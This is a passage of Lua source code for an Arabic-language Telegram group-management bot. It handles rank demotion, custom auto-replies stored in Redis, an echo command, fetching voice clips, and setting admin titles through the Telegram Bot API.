if database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_) then
crr = 'منشئ اساسي ،' else crr = '' end
if database:sismember(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_) then
cr = 'منشئ ،' else cr = '' end
if database:sismember(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_) then
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
if database:sismember(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_) then
mod = 'ادمن ،' else mod = '' end
if database:sismember(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_) then
vip = 'مميز ،' else vip = ''
end
if Can_or_NotCan(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n✯︙تم تنزيل الشخص من الرتب التاليه \n✯︙{ "..dev..''..crr..''..cr..''..own..''..cu..''..mod..''..mn..''..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n✯︙عذرا العضو لايملك رتبه \n")
end
if tonumber(SUDO) == tonumber(msg.sender_user_id_) then
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Dev:WaTaN:2',msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Sudo:User',msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:sadd(bot_id.."CoSu"..msg.chat_id_, database:get(bot_id.."CoSuv"..msg.chat_id_))
elseif database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
elseif database:sismember(bot_id..'Manager'..msg.chat_id_, msg.sender_user_id_) then
database:srem(bot_id..'abbas:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end

if text == ("مسح ردود المطور") and ChanSub(msg) and DevWaTaN(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id.."List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"✯︙تم مسح ردود المطور")
end
if text == ("ردود المطور") and ChanSub(msg) and DevWaTaN(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n✯︙قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = "متحركه 🎭"
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = "بصمه 📢"
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = "ملصق 🏷"
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = "رساله ✉"
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = "صوره 👤"
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = "فيديو 📹"
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = "ملف 📁"
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = "اغنيه 🎵"
end
text = text..""..k.." >> ("..v..") -› {"..db.."}\n"
end
if #list == 0 then
text = "✯︙لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Sudo:stekr"..test, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Sudo:vico"..test, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Sudo:Gif"..test, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Sudo:Audio"..test, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Sudo:File"..test, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Sudo:Video"..test, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Sudo:Photo"..test, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"✯︙تم حفظ الرد بنجاح")
return false  
end  
end

if text == "اضف رد للكل" and ChanSub(msg) and DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,"✯︙ارسل الكلمه التي تريد اضافتها")
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد للكل" and ChanSub(msg) and DevWaTaN(msg) then 
send(msg.chat_id_, msg.id_,"✯︙ارسل الكلمه التي تريد حذفها")
database:set(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '✯︙الان ارسل الرد الذي تريد اضافته \n✯︙قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n✯︙يمكنك اضافه الى النص :\n✯︙🌐 `#username` > معرف المستخدم\n✯︙📨 `#msgs` > عدد رسائل المستخدم\n✯︙📎 `#name` > اسم المستخدم\n✯︙🆔 `#id` > ايدي المستخدم\n✯︙🎖 `#stast` > رتبه المستخدم \n✯︙📝 `#edit` > عدد السحكات ')
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"✯︙تم ازالة الرد من قائمه ردود المطور")
list = {"Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
database:del(bot_id..''..v..text)
end
database:del(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Rd:Sudo", text)
return false
end
end

if text and not database:get(bot_id.."Reply:Sudo"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Sudo:Gif"..text)   
local veico = database:get(bot_id.."Add:Rd:Sudo:vico"..text)   
local stekr = database:get(bot_id.."Add:Rd:Sudo:stekr"..text)     
local Text = database:get(bot_id.."Add:Rd:Sudo:Text"..text)   
local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)

if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local Msguser = database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local edit = database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit)
local Text = Text:gsub('#msgs',Msguser)
local Text = Text:gsub('#stast',rtp)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Texting"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n✯︙ارسل الكلمه التي تريد اضافتها')
database:set(bot_id.."botss:WaTaN:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:WaTaN:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:WaTaN:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:WaTaN:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"✯︙تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:WaTaN:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:WaTaN:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:WaTaN:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:WaTaN:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:WaTaN:List:Rd:Sudo", text)
return false
end
end
if text == ("مسح الردود المتعدده") and ChanSub(msg) and CoSu(msg) then
local list = database:smembers(bot_id.."botss:WaTaN:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:WaTaN:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:WaTaN:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"✯︙تم حذف الردود المتعدده")
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == ("مسح ردود المدير") and ChanSub(msg) and Manager(msg) then
local list = database:smembers(bot_id.."List:Manager"..msg.chat_id_.."")
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id.."List:Manager"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"✯︙تم مسح ردود المدير")
end
if text == ("ردود المدير") and ChanSub(msg) and Manager(msg) then
local list = database:smembers(bot_id.."List:Manager"..msg.chat_id_.."")
text = "✯︙قائمه ردود المدير \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = "متحركه 🎭"
elseif database:get(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = "بصمه 📢"
elseif database:get(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = "ملصق 🏷"
elseif database:get(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = "رساله ✉"
elseif database:get(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = "صوره 👤"
elseif database:get(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = "فيديو 📹"
elseif database:get(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_) then
db = "ملف 📁"
elseif database:get(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = "اغنيه 🎵"
end
text = text..""..k..">> ("..v..") -› {"..db.."}\n"
end
if #list == 0 then
text = "✯︙لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,"✯︙تم حفظ الرد بنجاح")
return false  
end  
end
if text == "اضف رد" and ChanSub(msg) and Mod(msg) then
send(msg.chat_id_, msg.id_,"✯︙ارسل الكلمه التي تريد اضافتها")
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد" and ChanSub(msg) and Mod(msg) then
send(msg.chat_id_, msg.id_,"✯︙ارسل الكلمه التي تريد حذفها")
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '✯︙الان ارسل الرد الذي تريد اضافته \n✯︙قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n✯︙يمكنك اضافه الى النص :\n✯︙🌐 `#username` > معرف المستخدم\n✯︙📨 `#msgs` > عدد رسائل المستخدم\n✯︙📎 `#name` > اسم المستخدم\n✯︙🆔 `#id` > ايدي المستخدم\n✯︙🎖 `#stast` > رتبه المستخدم \n✯︙📝 `#edit` > عدد السحكات ')
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
database:set(bot_id.."Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_.."") == "true2" then
send(msg.chat_id_, msg.id_,"✯︙تم ازالة الرد من قائمه الردود")
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."List:Manager"..msg.chat_id_.."", text)
return false
end
end
if text and not database:get(bot_id.."Reply:Manager"..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local Text = database:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local Msguser = database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
local edit = database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit)
local Text = Text:gsub('#msgs',Msguser)
local Text = Text:gsub('#stast',rtp)
send(msg.chat_id_, msg.id_,'['..Text..']')
database:sadd(bot_id.."Spam:Texting"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^كول (.*)$") and ChanSub(msg) and not database:get(bot_id.."Speak:after:me"..msg.chat_id_) then
local Textxt = text:match("^كول (.*)$")
send(msg.chat_id_, msg.id_, '['..Textxt..']')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end

if text == "غنيلي" and ChanSub(msg) and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
if res == 200 then
audios = json:decode(data)
if audios.Info == true then
local Text ='✯︙تم اختيار المقطع الصوتي لك'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.',url="t.me/WaTaNTeaM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if text == "راسلني" and ChanSub(msg) then
rpl = {"ها هلاو","انطق","كول"};
sender = rpl[math.random(#rpl)]
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(sender))
end
if text and text:match("^وضع لقب (.*)$") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local timsh = text:match("^وضع لقب (.*)$")
function start_function(extra, result, success)
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.result.can_promote_members == false then
send(msg.chat_id_, msg.id_,'✯︙لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n✯︙قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..') '
status  = '\n✯︙الايدي » '..result.sender_user_id_..'\n✯︙تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..timsh)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("حذف لقب") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'
status  = '\n✯︙الايدي » `'..result.sender_user_id_..'`\n✯︙تم حذف لقبه من الكروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
